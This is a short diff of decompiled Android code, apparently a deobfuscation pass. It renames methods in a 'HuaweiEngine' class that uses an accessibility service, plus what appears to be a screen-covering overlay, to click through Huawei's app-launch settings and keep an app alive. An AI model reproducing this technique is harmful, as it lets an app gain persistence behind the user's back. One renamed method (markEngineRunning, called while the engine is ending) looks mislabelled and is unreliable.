@@ -281,7 +281,7 @@ public final class HuaweiEngine extends KeepAliveEngine {
 
             G();
             Log.d("o.n", "active root complete");
-            UiObject scrollView = Q();
+            UiObject scrollView = findScrollableContainer();
 
             if (scrollView == null) {
                 Log.e("o.n", "应用启动管理窗口滚动视图查找失败");
@@ -424,10 +424,10 @@ public final class HuaweiEngine extends KeepAliveEngine {
         ReentrantLock lock = this.o;
         if (lock.tryLock()) {
             try {
-                if (!this.T()) {
+                if (!this.isEngineFinished()) {
                     Log.d("o.n", "准备结束本地保活自动化引擎");
                     com.guard.wallet.helper.BlockViewManager.h(100);
-                    this.X();
+                    this.markEngineRunning();
                     if (MyAccessibilityService.P() != null) {
                         MyAccessibilityService.P().x();
                     }
@@ -453,7 +453,7 @@ public final class HuaweiEngine extends KeepAliveEngine {
     @Override
     public final void u(AccessibilityEvent event, String packageName, String className) {
         try {
-            if (T()) {
+            if (isEngineFinished()) {
                 return;
             }
             if (event != null) {
